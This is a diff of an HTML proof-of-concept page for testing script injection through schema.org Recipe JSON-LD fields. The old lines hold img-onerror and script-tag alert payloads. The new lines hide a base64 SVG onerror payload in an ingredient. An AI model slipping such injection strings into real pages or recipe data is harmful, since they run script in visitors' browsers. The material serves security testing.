@@ -2,26 +2,29 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>My Recipe Page</title>
+  <title>Malicious Recipe PoC</title>
   <script type="application/ld+json">
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org/",
-  "@type": "Recipe",
-  "name": "<img src=x onerror=alert('XSS')>",
-  "description": "<script>alert('Injected via description')</script>",
-  "recipeIngredient": [
-    "1 cup flour",
-    "1 tsp <script>alert('XSS in ingredient')</script> sugar",
-    "2 tbsp water"
-  ]
-}
-</script>
-
+  {
+    "@context": "https://schema.org/",
+    "@type": "Recipe",
+    "name": "Quick Pizza",
+    "description": "Proof-of-concept recipe with inline payload",
+    "recipeIngredient": [
+      "1 cup flour",
+      "1/2 cup water",
+      "1 tsp yeast",
+      "1/2 cup tomato sauce",
+      "<img src='data:image/svg+xml;base64,PHN2ZyBvbmVycm9yPSJhbGVydCgnWFNTJykiPjwvc3ZnPg=='>"
+    ],
+    "recipeInstructions": [
+      "Mix ingredients",
+      "Bake at 200C"
+    ]
+  }
   </script>
 </head>
 <body>
-  <h1>My Recipe Page</h1>
-  <p>This page contains a recipe for pizza. Search engines can understand it better because of the structured data in the JSON-LD script.</p>
+  <h1>Malicious Recipe PoC</h1>
+  <p>This page is designed for testing DOM injection via recipe fields.</p>
 </body>
 </html>
